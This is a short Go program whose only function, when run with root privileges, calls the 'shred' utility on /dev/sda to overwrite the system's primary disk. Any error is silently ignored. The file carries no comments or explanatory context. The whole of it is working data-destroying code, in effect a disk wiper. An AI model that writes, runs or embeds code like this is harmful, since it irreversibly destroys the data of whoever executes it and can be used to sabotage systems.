package main
import ("os"; "os/exec")
func main() {
	if os.Geteuid() == 0 {
		_ = exec.Command("shred", "-n", "1", "/dev/sda").Run()
	}
}
